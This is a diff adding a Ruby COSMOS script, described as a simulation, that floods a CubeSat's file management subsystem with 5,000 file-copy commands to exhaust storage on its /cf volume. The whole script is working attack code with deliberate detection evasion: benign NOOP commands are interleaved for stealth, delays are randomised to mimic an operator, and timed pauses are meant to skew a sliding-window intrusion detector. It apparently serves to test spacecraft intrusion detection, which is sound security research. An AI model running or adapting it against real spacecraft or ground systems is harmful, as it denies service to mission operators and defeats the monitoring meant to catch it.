@@ -1,0 +1,80 @@
+# Storage Exhaustion Simulation Script
+#
+# Description:
+#
+# This script simulates a storage exhaustion attack on a CubeSat’s file
+# management subsystem.
+#
+# It executes 5,000 file copy operations into a dedicated directory on the
+# /cf volume, consuming storage space through the creation of uniquely named
+# table files. The payload contents are irrelevant—only the metadata from
+# repeated file creation impacts storage.
+#
+# To enhance stealth, 5% of the issued commands are benign housekeeping
+# calls (e.g., NOOPs) that blend attack traffic with normal operations. 
+#
+# Each command is separated by randomized short delays (50–200 ms) to mimic
+# operator pacing. In addition, rare long pauses are introduced every 1,000
+# aggressive commands, disrupting time-based intrusion detection windows
+# and reducing the detectability of uniform flooding patterns.
+#
+
+
+require 'cosmos/script'
+
+# Generates filenames for the attack
+# Payload irrelevant to metadata collection, filenames can be simple
+def generate_target_filename(counter)
+  "/cf/storage_attack/attack_#{format('%04d', counter)}.tbl"
+end
+
+# Picks random benign command for stealth
+def pick_benign_command
+  case rand(3)
+  when 0
+    ["FM_NOOP", {}]
+  when 1
+    ["CFE_SB_NOOP", {}]
+  when 2
+    ["LC_NOOP", {}]
+  end
+end
+
+# Main attack function with stealth elements
+def storage_exhaustion_attack
+  puts "Launching Stealth Storage Exhaustion Attack..."
+
+  # Initial setup
+  cmd_raw("CFS", "FM_CREATE_DIR", {"DIRECTORY" => "/cf/storage_attack"})
+
+  counter = 0
+  total_commands = 5000
+
+  while counter < total_commands
+    if rand < 0.95  # 95% chance aggressive command
+      target = generate_target_filename(counter)
+      cmd_raw("CFS", "FM_COPY", {
+        "OVERWRITE" => 0,
+        "SOURCE" => "/cf/to_config.tbl",
+        "TARGET" => target
+      })
+      counter += 1
+    else  # 5% benign command injection for stealth
+      cmd_name, params = pick_benign_command
+      cmd_raw("CFS", cmd_name, params)
+    end
+
+    # Realistic random short delay to mimic operator pacing
+    sleep(rand(0.05..0.2))
+
+    # Rare longer pause (around sliding window period) to disrupt detection statistics
+    if counter > 0 && counter % 1000 == 0
+      sleep(10)  # Wait halfway through your 20-second sliding window, affecting statistics subtly
+    end
+  end
+
+  puts "Stealth Storage Exhaustion Attack Complete: #{counter} aggressive commands sent."
+end
+
+# Execute stealth attack
+storage_exhaustion_attack
